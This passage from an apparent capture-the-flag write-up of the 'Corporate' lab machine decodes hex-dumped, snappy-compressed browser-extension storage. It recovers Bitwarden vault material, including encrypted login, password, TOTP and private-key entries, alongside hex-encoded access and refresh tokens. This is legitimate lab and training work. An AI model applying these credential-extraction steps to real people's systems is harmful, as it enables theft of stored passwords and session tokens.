6E6465223617D9401EC838047961163C0A117811980D3800611E980C01E001983A200000621ED80B51E871B00D4000631EEA1851E871281520086D2E610E9B0F51E84A200000670EFC0BE12801804A200012780DA1E801203AA0000065013C010151E03A200012940801011EB8093E20000E9408010151D83A2000006BF1D41EA8093E2000314081A04AA0001EF1392298093A4000006C0E740E01011E98093A2000006D1295112A78103A200022580C1E98093A200022380C1E98093A200004746A015D45ECC9603E200021BC01011E98093A200000750EB40F01011E98093E20003120010141D000530D6841902ED0029E7822716091200EA82271B5016000540D6041D02E600011980EA039086F6E2E163D4E7D309128092026E33301A821D8519809200476702E3405017800550D7801302E78009160087562692AFE3379A81E001804756299D1015000565A50001E4008287472616E7366657277697312D32A3E1801111801E4015000570D5061282EA00071D01474616B65617716D41A0134115011C0206A7573742D6561742E12260C26001F4220001A0A0F218021384220006D729150422000122E0E26C8143178246C6965666572616E646FA91E3E50041D2000612E3009D1802C746875697362657A6F7267640E0A0C3E5004147079737A6E6579500101213800582D3801702E380111981861746C61737369220F19313811201062697462750E5A271A571641202118B1C000740EF6082AA80A313811400EA425087573700EB81600690E64103138112019800E660A39387120086A697222771901D011D81108318020617661746172436F6C165B400D0126D83C16400C10436F6E6669B11312803E51C0127C17006F0E4214000012084011180867697412204101010E2040F1C00950011601012668410875746312DC501E20213698402433393A34382E3536305A11B82A484001490D0126403F011101F811780C746F6B651E5D3D0E403F11481861636365737354011E01330800A30316E8355865794A30655841694F694A4B563151694C434A686247630110F09A53557A49314E694A392E65794A75596D59694F6A45324F4445304D4441304D6A6B73496D5634634349364D5459344D5451774E7A59794F53776961584E7A496A6F696148523063446F764C327876593246736147397A644878736232647062694973496E4E3159694936496A4134596A4D334E5446694C5746685A4455744E4459784E6931694D5759334C5441784E57517A596D55334E446C6B59053C6042795A573170645730694F6E527964575573496D356862575501BD08466248016420424B6232356C63794901ACA87459576C73496A6F695A57783361573475616D39755A584E4159323979634739795958526C4C6D6830596919307058335A6C636D6C6D6157566B496A7030636E566C4C434A76636D647664015C8869493657313073496D39795A32466B62576C75496A70625853776962334A6E64584E6C362400583168626D466E5A5849694F6C74644C434A7A63335268622585C04934597A49795A6A67314F5330774E574E6B4C5451314E4441744F5445314D53316C4E54426C5A44526D4E4446684D546321B1186B5A585A70593205F8146B595759325A218C907930304D7A55324C54526A4D6D51744F44646B4E693032596A526B597A6B784E5455794D5425F13C7A593239775A53493657794A6863476B01544C765A6D5A736157356C5832466A5932567A63794A01AC04686205B8F4F20173695158427762476C6A59585270623234695858302E5367594A4D6F69426E755668464D53456C4A30504A647A633731697644384B64586A75596541434E6F69626B45695954626D6771754C67597A6A3569337559704A4B573851347A70544C6468376B6663583838785143524730554B365470515844324B694E3349765445736D676A4F444C6F7A56505F5452454C424377336866674F75696167636F65717A465146486E5A397052573233454B6A4356597449533471743645516A497A2D7A496A4F6C6E4F7A53653352424432394944344D5137377246556E545F733074354F4A70717A4162476C692D7A72747370737A305F68526C697975767079464A4A525431516C332D664638707235555F6955317473542D317568435933744F5F31626C576B3831776B6B6A5A5837354267415839596D4E6B5174475231314E6B5F67313653565953786930516B7242513043466451694B6250744F47685775633734375A644D62665759567700000000000C0000800400FFFF72656672657368546F6B656E00000000580000800400FFFF45745A4F5742584D78385746756350784E5567352D576D2D7571434B2D356835556A62303741543436686A363470317953784D4F62306775734E755F314E75363550474E545965324853335557796E6B546E327335673D3D000000001300FFFF090089301067726F75700EC40D85460901816800101EF00B22285600430EC7270D27B9681668522E1C00010104FFFFD530087970653E1E000E5044D1E81E885700432AD858A1781120086E6F461222583E2000B1B02E105901381118099809AF01180196A1581EB0450ED8520114010101F07EB0001EA00C01380956C9380140015811782E900001581120D1E001401E99472E20001C000000001300FFFF
50040300010104F1FF0106C00800FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200013538100967B4777842000000001300FFFF
380403000101C4F1FF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000
380403000101C4F1FF240000800400FFFF64616636653430372D343335362D346332642D383764362D36623464633931353532313400000000
50040300010124F1FF010000000700FFFF010EEC0300FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000000000001300FFFF
A009040300010104F1FF0106500800FFFF050000800400FFFF7468656D65000000060D101473797374656D19101477696E646F77013600000538010A101300FFFF0C1130287461746556657273696F6E011C20060000000300FFFF0F0D2038656E7669726F6E6D656E7455726C730123054800040D2008626173017F1000310000000190C868007400740070003A002F002F00700061007300730077006F0072006400740065007300740069006E006700730065007200760506082D00630524007005060061052A402E006C006F00630061006C003A003800300502090100030D80086170690911050108FFFF080D181C6964656E746974790517000019181C7765625661756C74111831480C69636F6E09DE010108FFFF0D0D48246E6F746966696361746936200000060D20106576656E74153939582C6B6579436F6E6E6563746F720152090100FF35801140106C6F63616C25421800000100FFFF160D58506E6F4175746F50726F6D707442696F6D65747269630D680128001A722800085465780DE20101013031D01473736F436F6421F20C69666965099B012000190D502473736F4F7267616E697A05F30449642147152A0901013031680C73736F534143011A011811683872656D656D6265726564456D61696C011F000021885178007621851454696D656F7515AA014000120D882E2000044163217E014009010128000A0D2820656E61626C655472612DEA010101200014322000244D696E696D697A65546F2E2A00012800113228000C436C6F733A25002D98362800105374617274364D000D28000B0D50246F70656E41744C6F676919B90170000E0D2034616C7761797353686F77446F636B013E490000180D2009D83442726F77736572496E74656772613106014800237A28002446696E6765727072696E355F0538118008646973213910466176696369FA1800000200FFFF1D0D58006251741D492056616C69646174656409AF30000200FFFF000000001300FFFF
```

And execute the following:

```bash
❯ counter=1;for data in $(cat data.hex); do xxd -r -p <(echo $data) data-$counter.snappy;let counter++;done
```

With that command, we create the following files:

```bash
❯ ls data-*.snappy
data-1.snappy   data-2.snappy   data-3.snappy   data-4.snappy   data-5.snappy   data-6.snappy
```

I will execute this python script to go for each of this files, decompress with snappy and append it to the file `data.snappy`:

```python
import snappy

for counter in range(1, 7):
    with open(f"data-{counter}.snappy", "rb") as file:
        snappy_bytes = file.read()
    blob = snappy.decompress(snappy_bytes)
    with open("data.snappy", "ab") as outfile:
        outfile.write(blob)
```

```bash
❯ python3 snappy-decrypt.py
```

And now we can read that file with xxd, but I will remove all the files created and move the data.snappy to my current directory:

```bash
❯ rm data-*.snappy
❯ rm snappy-decrypt.py
❯ rm data.hex
❯ mv data.snappy ~/Desktop/HTB/machines/Corporate-10.10.11.246/content/.
❯ cd ~/Desktop/HTB/machines/Corporate-10.10.11.246/content/
```

```bash
❯ xxd data.snappy
00000000: 0300 0000 0000 f1ff 0000 0000 0800 ffff  ................
00000010: 0400 0080 0400 ffff 6461 7461 0000 0000  ........data....
00000020: 0000 0000 0800 ffff 0700 0080 0400 ffff  ................
00000030: 6369 7068 6572 7300 0000 0000 0800 ffff  ciphers.........
00000040: 0900 0080 0400 ffff 656e 6372 7970 7465  ........encrypte
00000050: 6400 0000 0000 0000 0000 0000 0800 ffff  d...............
00000060: 2400 0080 0400 ffff 3535 3334 6636 6137  $.......5534f6a7
00000070: 2d31 3830 662d 3430 6530 2d62 6630 382d  -180f-40e0-bf08-
00000080: 6563 3137 3537 3635 3164 6466 0000 0000  ec1757651ddf....
00000090: 0000 0000 0800 ffff 0200 0080 0400 ffff  ................
000000a0: 6964 0000 0000 0000 2400 0080 0400 ffff  id......$.......
000000b0: 3535 3334 6636 6137 2d31 3830 662d 3430  5534f6a7-180f-40
000000c0: 6530 2d62 6630 382d 6563 3137 3537 3635  e0-bf08-ec175765
000000d0: 3164 6466 0000 0000 0e00 0080 0400 ffff  1ddf............
000000e0: 6f72 6761 6e69 7a61 7469 6f6e 4964 0000  organizationId..
000000f0: 0000 0000 0000 ffff 0800 0080 0400 ffff  ................
00000100: 666f 6c64 6572 4964 0000 0000 0000 ffff  folderId........
00000110: 0400 0080 0400 ffff 6564 6974 0000 0000  ........edit....
00000120: 0100 0000 0200 ffff 0c00 0080 0400 ffff  ................
00000130: 7669 6577 5061 7373 776f 7264 0000 0000  viewPassword....
00000140: 0100 0000 0200 ffff 1300 0080 0400 ffff  ................
00000150: 6f72 6761 6e69 7a61 7469 6f6e 5573 6554  organizationUseT
00000160: 6f74 7000 0000 0000 0100 0000 0200 ffff  otp.............
00000170: 0800 0080 0400 ffff 6661 766f 7269 7465  ........favorite
00000180: 0000 0000 0200 ffff 0c00 0080 0400 ffff  ................
00000190: 7265 7669 7369 6f6e 4461 7465 0000 0000  revisionDate....
000001a0: 1b00 0080 0400 ffff 3230 3233 2d30 342d  ........2023-04-
000001b0: 3133 5431 343a 3439 3a34 362e 3335 3739  13T14:49:46.3579
000001c0: 3739 5a00 0000 0000 0400 0080 0400 ffff  79Z.............
000001d0: 7479 7065 0000 0000 0100 0000 0300 ffff  type............
000001e0: 0400 0080 0400 ffff 6e61 6d65 0000 0000  ........name....
000001f0: 6000 0080 0400 ffff 322e 5152 4639 7649  `.......2.QRF9vI
00000200: 4351 7244 6548 392f 7037 4f30 7744 4767  CQrDeH9/p7O0wDGg
00000210: 3d3d 7c67 4e4a 5078 3546 6449 6639 7773  ==|gNJPx5FdIf9ws
00000220: 6672 7937 472f 4161 413d 3d7c 4b62 3034  fry7G/AaA==|Kb04
00000230: 6775 6a35 676e 4651 6564 5645 552f 5778  guj5gnFQedVEU/Wx
00000240: 5953 3544 4450 4847 4549 7532 2b5a 5867  YS5DDPHGEIu2+ZXg
00000250: 3155 554e 7a41 733d 0500 0080 0400 ffff  1UUNzAs=........
00000260: 6e6f 7465 7300 0000 0000 0000 0000 ffff  notes...........
00000270: 0d00 0080 0400 ffff 636f 6c6c 6563 7469  ........collecti
00000280: 6f6e 4964 7300 0000 0000 0000 0700 ffff  onIds...........
00000290: 0000 0000 1300 ffff 0c00 0080 0400 ffff  ................
000002a0: 6372 6561 7469 6f6e 4461 7465 0000 0000  creationDate....
000002b0: 1b00 0080 0400 ffff 3230 3233 2d30 342d  ........2023-04-
000002c0: 3133 5431 343a 3439 3a34 362e 3335 3738  13T14:49:46.3578
000002d0: 3038 5a00 0000 0000 0b00 0080 0400 ffff  08Z.............
000002e0: 6465 6c65 7465 6444 6174 6500 0000 0000  deletedDate.....
000002f0: 0000 0000 0000 ffff 0800 0080 0400 ffff  ................
00000300: 7265 7072 6f6d 7074 0000 0000 0300 ffff  reprompt........
00000310: 0500 0080 0400 ffff 6c6f 6769 6e00 0000  ........login...
00000320: 0000 0000 0800 ffff 0800 0080 0400 ffff  ................
00000330: 7573 6572 6e61 6d65 6000 0080 0400 ffff  username`.......
00000340: 322e 5632 6168 4475 6743 3137 6844 6373  2.V2ahDugC17hDcs
00000350: 3144 5854 7553 4951 3d3d 7c68 6a62 7463  1DXTuSIQ==|hjbtc
00000360: 6835 666d 5372 6e51 7930 4535 4462 3857  h5fmSrnQy0E5Db8W
00000370: 513d 3d7c 5530 5059 6c73 3459 6335 6e53  Q==|U0PYls4Yc5nS
00000380: 344a 6a2f 3457 7736 324e 7755 484a 5654  4Jj/4Ww62NwUHJVT
00000390: 574f 6673 4e2f 5934 5259 4171 4f48 4d3d  WOfsN/Y4RYAqOHM=
000003a0: 0800 0080 0400 ffff 7061 7373 776f 7264  ........password
000003b0: 7400 0080 0400 ffff 322e 4970 6833 3671  t.......2.Iph36q
000003c0: 6d43 6f6d 6169 7377 4c62 3134 576c 4141  mComaiswLb14WlAA
000003d0: 3d3d 7c50 494b 4370 5a55 6a55 6168 7849  ==|PIKCpZUjUahxI
000003e0: 5a44 5938 3541 336c 4733 494a 7675 774e  ZDY85A3lG3IJvuwN
000003f0: 4b37 696a 4c50 4930 624f 7339 776f 3d7c  K7ijLPI0bOs9wo=|
00000400: 6578 7734 656a 5767 6a2b 4a34 4a4d 7656  exw4ejWgj+J4JMvV
00000410: 6556 4e52 5a41 4145 6c2b 4145 4261 3976  eVNRZAAEl+AEBa9v
00000420: 3374 3246 7341 6272 4b35 303d 0000 0000  3t2FsAbrK50=....
00000430: 1400 0080 0400 ffff 7061 7373 776f 7264  ........password
00000440: 5265 7669 7369 6f6e 4461 7465 0000 0000  RevisionDate....
00000450: 0000 0000 0000 ffff 0400 0080 0400 ffff  ................
00000460: 746f 7470 0000 0000 b400 0080 0400 ffff  totp............
00000470: 322e 6c6f 5575 7457 6f55 5037 7742 7844  2.loUutWoUP7wBxD
00000480: 7558 6c50 2f35 4551 3d3d 7c73 5339 5655  uXlP/5EQ==|sS9VU
00000490: 656b 5534 7039 7565 6876 626b 376a 6768  ekU4p9uehvbk7jgh
000004a0: 706e 7134 386e 7768 5853 4430 3641 3555  pnq48nwhXSD06A5U
000004b0: 4c47 4c73 4836 6c61 772f 514b 6669 584d  LGLsH6law/QKfiXM
000004c0: 6d59 7979 3836 3831 6349 5753 5752 3750  mYyy8681cIWSWR7P
000004d0: 474b 752f 5570 554f 4935 3461 7852 6462  GKu/UpUOI54axRdb
000004e0: 4f6a 3969 6456 4859 4938 6a47 3278 415a  Oj9idVHYI8jG2xAZ
000004f0: 2f37 6a67 7163 3d7c 764e 5a33 5a39 4558  /7jgqc=|vNZ3Z9EX
00000500: 4537 2f42 7830 4737 4168 6333 7636 3666  E7/Bx0G7Ahc3v66f
00000510: 3739 736c 6f46 4370 5157 6951 4a76 3968  79sloFCpQWiQJv9h
00000520: 4e62 343d 0000 0000 1200 0080 0400 ffff  Nb4=............
00000530: 6175 746f 6669 6c6c 4f6e 5061 6765 4c6f  autofillOnPageLo
00000540: 6164 0000 0000 0000 0000 0000 0000 ffff  ad..............
00000550: 0400 0080 0400 ffff 7572 6973 0000 0000  ........uris....
00000560: 0100 0000 0700 ffff 0000 0000 0300 ffff  ................
00000570: 0000 0000 0800 ffff 0500 0080 0400 ffff  ................
00000580: 6d61 7463 6800 0000 0000 0000 0000 ffff  match...........
00000590: 0300 0080 0400 ffff 7572 6900 0000 0000  ........uri.....
000005a0: 7400 0080 0400 ffff 322e 466c 4354 4261  t.......2.FlCTBa
000005b0: 5862 7864 6d70 6265 4f6b 6336 7356 5651  XbxdmpbeOkc6sVVQ
000005c0: 3d3d 7c37 484b 5358 2f38 3041 735a 336b  ==|7HKSX/80AsZ3k
000005d0: 686b 4150 4775 364b 4c39 4672 7253 3153  hkAPGu6KL9FrrS1S
000005e0: 7432 4367 7367 7870 6241 6235 6734 3d7c  t2CgsgxpbAb5g4=|
000005f0: 4139 4638 566d 7876 344e 6c4e 4b72 426b  A9F8Vmxv4NlNKrBk
00000600: 556c 6c32 346d 7337 3867 4139 7752 4b4d  Ull24ms78gA9wRKM
00000610: 7963 3363 5676 4967 4853 6f3d 0000 0000  yc3cVvIgHSo=....
00000620: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00000630: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00000640: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00000650: 0700 0080 0400 ffff 666f 6c64 6572 7300  ........folders.
00000660: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
00000670: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
00000680: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
00000690: 0000 0000 1300 ffff 0500 0080 0400 ffff  ................
000006a0: 7365 6e64 7300 0000 0000 0000 0800 ffff  sends...........
000006b0: 0900 0080 0400 ffff 656e 6372 7970 7465  ........encrypte
000006c0: 6400 0000 0000 0000 0000 0000 0800 ffff  d...............
000006d0: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
000006e0: 0b00 0080 0400 ffff 636f 6c6c 6563 7469  ........collecti
000006f0: 6f6e 7300 0000 0000 0000 0000 0800 ffff  ons.............
00000700: 0900 0080 0400 ffff 656e 6372 7970 7465  ........encrypte
00000710: 6400 0000 0000 0000 0000 0000 0800 ffff  d...............
00000720: 0000 0000 1300 ffff 0000 0000 1300 ffff  ................
00000730: 0800 0080 0400 ffff 706f 6c69 6369 6573  ........policies
00000740: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
00000750: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
00000760: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
00000770: 0000 0000 1300 ffff 1900 0080 0400 ffff  ................
00000780: 7061 7373 776f 7264 4765 6e65 7261 7469  passwordGenerati
00000790: 6f6e 4869 7374 6f72 7900 0000 0000 0000  onHistory.......
000007a0: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
000007b0: 0d00 0080 0400 ffff 6f72 6761 6e69 7a61  ........organiza
000007c0: 7469 6f6e 7300 0000 0000 0000 0800 ffff  tions...........
000007d0: 0000 0000 1300 ffff 0900 0080 0400 ffff  ................
000007e0: 7072 6f76 6964 6572 7300 0000 0000 0000  providers.......
000007f0: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
00000800: 0000 0000 1300 ffff 0400 0080 0400 ffff  ................
00000810: 6b65 7973 0000 0000 0000 0000 0800 ffff  keys............
00000820: 1200 0080 0400 ffff 6372 7970 746f 5379  ........cryptoSy
00000830: 6d6d 6574 7269 634b 6579 0000 0000 0000  mmetricKey......
00000840: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
00000850: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
00000860: b400 0080 0400 ffff 322e 5031 4c71 7430  ........2.P1Lqt0
00000870: 5378 3152 3243 5174 524e 6b4d 6635 6667  Sx1R2CQtRNkMf5fg
00000880: 3d3d 7c65 436f 4b4b 3372 4c4f 4644 722b  ==|eCoKK3rLOFDr+
00000890: 686b 454d 6e4d 5874 304a 5663 4871 5058  hkEMnMXt0JVcHqPX
000008a0: 4375 6a72 4756 6973 2b47 7977 3146 7231  CujrGVis+Gyw1Fr1
000008b0: 4533 6753 632f 766d 6d68 372f 4776 7871  E3gSc/vmmh7/Gvxq
000008c0: 3558 7472 6d38 7731 5167 7753 312f 4950  5Xtrm8w1QgwS1/IP
000008d0: 5147 4578 656f 7866 7a50 6743 6154 3545  QGExeoxfzPgCaT5E
000008e0: 3768 6933 6139 6236 3961 3656 4159 3d7c  7hi3a9b69a6VAY=|
000008f0: 3635 6464 756d 6937 5773 7767 5430 5946  65ddumi7WswgT0YF
00000900: 796a 5a2b 7041 686a 7662 4430 3861 2b46  yjZ+pAhjvbD08a+F
00000910: 7631 3576 3472 4f34 5067 633d 0000 0000  v15v4rO4Pgc=....
00000920: 0000 0000 1300 ffff 1000 0080 0400 ffff  ................
00000930: 6f72 6761 6e69 7a61 7469 6f6e 4b65 7973  organizationKeys
00000940: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
00000950: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
00000960: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
00000970: 0000 0000 1300 ffff 0c00 0080 0400 ffff  ................
00000980: 7072 6f76 6964 6572 4b65 7973 0000 0000  providerKeys....
00000990: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
000009a0: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
000009b0: 0000 0000 0800 ffff 0000 0000 1300 ffff  ................
000009c0: 0000 0000 1300 ffff 0a00 0080 0400 ffff  ................
000009d0: 7072 6976 6174 654b 6579 0000 0000 0000  privateKey......
000009e0: 0000 0000 0800 ffff 0900 0080 0400 ffff  ................
000009f0: 656e 6372 7970 7465 6400 0000 0000 0000  encrypted.......
00000a00: b406 0080 0400 ffff 322e 7864 4d59 3237  ........2.xdMY27
00000a10: 4d68 5032 6a52 6d75 444f 2f52 6a64 7877  MhP2jRmuDO/Rjdxw
00000a20: 3d3d 7c50 7554 436a 666a 3630 6558 3566  ==|PuTCjfj60eX5f
00000a30: 5138 3475 4d59 356d 3632 7449 2f34 6738  Q84uMY5m62tI/4g8
00000a40: 4a64 3835 4564 4f2f 3159 6546 5259 4e36  Jd85EdO/1YeFRYN6
00000a50: 6877 4b53 7365 564a 3378 6251 3931 4e4c  hwKSseVJ3xbQ91NL
00000a60: 314e 6658 6c46 3233 4f36 6974 4673 696f  1NfXlF23O6itFsio
00000a70: 6f63 7445 3255 7530 717a 7174 717a 4b6b  octE2Uu0qzqtqzKk
00000a80: 3047 7433 4c78 6a4e 6558 7367 3077 4937  0Gt3LxjNeXsg0wI7
00000a90: 5948 7369 5045 6338 5649 6a6e 4169 5a34  YHsiPEc8VIjnAiZ4
00000aa0: 614b 6674 4f4b 4c61 2b4e 436b 6346 4e4a  aKftOKLa+NCkcFNJ
00000ab0: 4d6e 4572 7136 7641 4448 6564 4948 7954  MnErq6vADHedIHyT
00000ac0: 6269 7532 7871 3435 7047 7530 724e 587a  biu2xq45pGu0rNXz
00000ad0: 6935 3962 506e 4f79 7775 6e77 6d5a 5732  i59bPnOywunwmZW2
00000ae0: 3054 7159 4e58 6149 6639 2b73 576f 3348  0TqYNXaIf9+sWo3H
00000af0: 7666 6541 524a 4c66 3470 3539 7a50 5a44  vfeARJLf4p59zPZD
00000b00: 3253 3431 476d 6f75 7530 6563 4b56 4272  2S41Gmouu0ecKVBr
00000b10: 4958 4d33 6534 662b 6763 5952 6843 7156  IXM3e4f+gcYRhCqV
00000b20: 3832 456a 7572 6e41 6872 514f 7432 4b69  82EjurnAhrQOt2Ki
00000b30: 5851 7433 7539 4e6c 2f7a 4438 4b64 5375  XQt3u9Nl/zD8KdSu
00000b40: 477a 6c56 786f 6339 4f44 5937 5049 4156  GzlVxoc9ODY7PIAV
00000b50: 7a56 506a 6142 544a 4465 6f54 712f 7a58  zVPjaBTJDeoTq/zX
00000b60: 3636 7a7a 3571 3039 3152 4e49 384b 564d  66zz5q091RNI8KVM
00000b70: 676a 376b 4c66 3033 4b70 5139 506a 6e6c  gj7kLf03KpQ9Pjnl
00000b80: 5a63 324a 6559 4f51 3479 576f 704c 5a33  Zc2JeYOQ4yWopLZ3
00000b90: 3831 7431 574f 4767 6553 2f69 3349 6234  81t1WOGgeS/i3Ib4
00000ba0: 3065 6b45 3553 4449 6b33 3347 6a50 744d  0ekE5SDIk33GjPtM
00000bb0: 372b 6354 3148 4633 3259 6c62 5949 396d  7+cT1HF32YlbYI9m
00000bc0: 7745 4857 546e 3479 4d50 354d 446b 5653  wEHWTn4yMP5MDkVS
00000bd0: 382b 456a 5a75 375a 4f76 5463 6937 762f  8+EjZu7ZOvTci7v/
00000be0: 374e 3078 3243 6f4b 3034 2f42 3676 596e  7N0x2CoK04/B6vYn
00000bf0: 4567 5a44 4257 6870 3574 3366 667a 4c45  EgZDBWhp5t3ffzLE
00000c00: 7537 5739 3843 3470 2b71 4b46 5546 3478  u7W98C4p+qKFUF4x
00000c10: 6d2b 7137 4845 4670 6639 5556 5458 4c62  m+q7HEFpf9UVTXLb
00000c20: 626d 5952 4d56 5732 7557 6830 6e67 4147  bmYRMVW2uWh0ngAG
00000c30: 4367 3359 7065 596e 3356 6b79 7635 4e6d  Cg3YpeYn3Vkyv5Nm
00000c40: 4878 6730 2b68 3250 5976 6631 6f39 6a65  Hxg0+h2PYvf1o9je
00000c50: 4961 5435 5155 526e 7232 5762 4a62 6473  IaT5QURnr2WbJbds
00000c60: 7573 5839 326c 3377 4a31 6651 3935 612f  usX92l3wJ1fQ95a/
00000c70: 2b7a 524f 4261 635a 316d 4e4c 3351 7a6f  +zROBacZ1mNL3Qzo
00000c80: 762f 626c 514a 6f63 4151 3830 326d 4949  v/blQJocAQ802mII
00000c90: 456f 5165 3058 6e68 4633 4442 6e59 3750  EoQe0XnhF3DBnY7P
00000ca0: 6e6f 565a 5431 6267 7832 6b61 4456 464c  noVZT1bgx2kaDVFL
00000cb0: 6c4d 4143 6f64 4d76 4661 3435 4e7a 3931  lMACodMvFa45Nz91
00000cc0: 4e42 3444 4e65 6a7a 7130 4d79 7534 564d  NB4DNejzq0Myu4VM
00000cd0: 584c 7730 7366 3057 644e 5a34 4545 6b42  XLw0sf0WdNZ4EEkB
00000ce0: 5455 6e56 4451 5366 2f35 737a 6172 6d57  TUnVDQSf/5szarmW
00000cf0: 3448 6745 616b 5839 4941 737a 5055 4d59  4HgEakX9IAszPUMY
00000d00: 474a 4b61 7151 3962 6635 5069 7361 7039  GJKaqQ9bf5Pisap9
00000d10: 6a5a 4f65 4e46 3230 4263 707a 7859 4e56  jZOeNF20BcpzxYNV
00000d20: 5445 5a65 5137 574f 446d 534f 3466 7374  TEZeQ7WODmSO4fst
00000d30: 6248 4435 6273 4a72 5238 7350 6355 3231  bHD5bsJrR8sPcU21
00000d40: 656b 654e 466a 4968 6c39 4337 3243 4357  ekeNFjIhl9C72CCW
00000d50: 4465 7647 4f46 4974 774c 4a70 3535 6458  DevGOFItwLJp55dX
00000d60: 312f 2f70 5844 6467 5249 5a78 2f44 2b7a  1//pXDdgRIZx/D+z
00000d70: 6172 3558 582b 4176 3341 674f 4579 4642  ar5XX+Av3AgOEyFB
00000d80: 3635 5564 4e6e 5165 5049 3755 4664 3433  65UdNnQePI7UFd43
00000d90: 612b 6b6d 4144 346e 3864 584a 6b61 6c32  a+kmAD4n8dXJkal2
00000da0: 4762 6842 657a 386a 3938 5134 4e30 3847  GbhBez8j98Q4N08G
00000db0: 646a 474d 3963 6162 5867 4556 6e69 6765  djGM9cabXgEVnige
00000dc0: 5072 6733 376b 3859 7268 4243 4c6d 536a  Prg37k8YrhBCLmSj
00000dd0: 4f7a 3430 4868 5954 366b 796e 3167 7334  Oz40HhYT6kyn1gs4
00000de0: 4e4a 5530 6f66 4436 6534 446c 3951 6c2f  NJU0ofD6e4Dl9Ql/
00000df0: 7237 3949 4271 6365 4d75 6c6e 3263 554c  r79IBqceMuln2cUL
00000e00: 396b 4259 6852 5352 5338 7646 3669 7562  9kBYhRSRS8vF6iub
00000e10: 5675 5668 3161 6d43 4e43 5031 6b49 756e  VuVh1amCNCP1kIun
00000e20: 6e2b 325a 5736 4f50 576c 446a 5663 7a65  n+2ZW6OPWlDjVcze
00000e30: 6273 6578 6957 6731 7467 4365 6b56 784c  bsexiWg1tgCekVxL
00000e40: 4570 7345 526f 2b68 3064 7133 3975 3747  EpsERo+h0dq39u7G
00000e50: 4c39 4876 306c 346e 3737 4964 524d 7339  L9Hv0l4n77IdRMs9
00000e60: 6c42 7771 3444 6a6a 6836 7652 4f2b 3465  lBwq4Djjh6vRO+4e
00000e70: 714c 774c 4c78 7235 4458 3351 6239 794d  qLwLLxr5DX3Qb9yM
00000e80: 2f62 656f 6e6e 4d56 454f 7672 3843 7070  /beonnMVEOvr8Cpp
00000e90: 6f72 5972 7555 794d 6d77 6c39 4f59 4342  orYruUyMmwl9OYCB
00000ea0: 704c 7768 6350 6950 3257 7434 7545 5548  pLwhcPiP2Wt4uEUH
00000eb0: 766b 526e 5a76 5955 2b78 4b74 5132 4948  vkRnZvYU+xKtQ2IH
00000ec0: 3836 696a 3475 6b47 514e 7550 694a 457a  86ij4ukGQNuPiJEz
00000ed0: 7676 375a 3233 6176 335a 7772 3169 774c  vv7Z23av3Zwr1iwL
00000ee0: 5655 5377 3843 5459 5064 6a4e 7738 7975  VUSw8CTYPdjNw8yu
00000ef0: 714d 455a 6b4d 4c77 6e49 5532 4a58 5535  qMEZkMLwnIU2JXU5
00000f00: 3347 7258 626f 464e 4755 776a 6c45 5147  3GrXboFNGUwjlEQG
00000f10: 6a37 6c31 506f 3468 4730 7535 5646 7248  j7l1Po4hG0u5VFrH
00000f20: 5141 697a 5530 4d61 5643 7844 4939 584a  QAizU0MaVCxDI9XJ
00000f30: 4842 5669 7359 4475 5354 5347 7354 492b  HBVisYDuSTSGsTI+
00000f40: 3473 3734 7263 6678 5866 6d64 656b 6e31  4s74rcfxXfmdekn1
00000f50: 6a53 6258 6f43 7830 6859 332f 5537 5a67  jSbXoCx0hY3/U7Zg
00000f60: 7954 7636 7049 6446 3155 354f 4556 4434  yTv6pIdF1U5OEVD4
00000f70: 7544 4c31 4b71 7832 6138 316e 4b36 5144  uDL1Kqx2a81nK6QD
00000f80: 7776 2f63 6e78 5443 5256 4b32 616f 4675  wv/cnxTCRVK2aoFu
00000f90: 5771 6774 3537 6253 6333 424d 2f47 5677  Wqgt57bSc3BM/GVw
00000fa0: 7550 736f 4d74 6f64 7a33 5776 714f 656c  uPsoMtodz3WvqOel
00000fb0: 4d50 4d59 6b76 6a51 4430 6d44 5031 4174  MPMYkvjQD0mDP1At
00000fc0: 362f 5666 4d66 5230 4e50 4e30 6576 7462  6/VfMfR0NPN0evtb
00000fd0: 4158 4f52 6478 7a4f 5768 6649 2f54 4475  AXORdxzOWhfI/TDu
00000fe0: 4f50 6a32 534c 5836 4938 6a61 3764 6a52  OPj2SLX6I8ja7djR
00000ff0: 7930 7953 6931 7363 3953 5474 6253 4365  y0ySi1sc9STtbSCe
00001000: 536a 4d4d 4439 6f68 2f49 6374 416a 3754  SjMMD9oh/IctAj7T
00001010: 7835 5838 5566 3571 4a59 4271 446a 5859  x5X8Uf5qJYBqDjXY
00001020: 6839 6f43 5950 6559 6b4a 4c64 356b 376b  h9oCYPeYkJLd5k7k
00001030: 635a 6f75 6c76 7464 6e50 7059 584e 647a  cZoulvtdnPpYXNdz
00001040: 4666 5274 7751 7764 3261 7332 4353 494b  FfRtwQwd2as2CSIK
00001050: 772b 4647 5350 6a42 4b7a 364d 644b 6d68  w+FGSPjBKz6MdKmh
00001060: 4b5a 494e 4e54 3076 596a 6767 5238 3555  KZINNT0vYjggR85U
00001070: 3736 4862 3350 6377 7273 654e 4861 2b4f  76Hb3PcwrseNHa+O
00001080: 4268 5950 3479 7167 634b 515a 3541 3d7c  BhYP4yqgcKQZ5A=|
00001090: 374a 6751 6469 6242 7862 7a34 3078 4e54  7JgQdibBxbz40xNT
000010a0: 4a4a 4857 6534 5638 4c4e 7239 457a 7a36  JJHWe4V8LNr9Ezz6
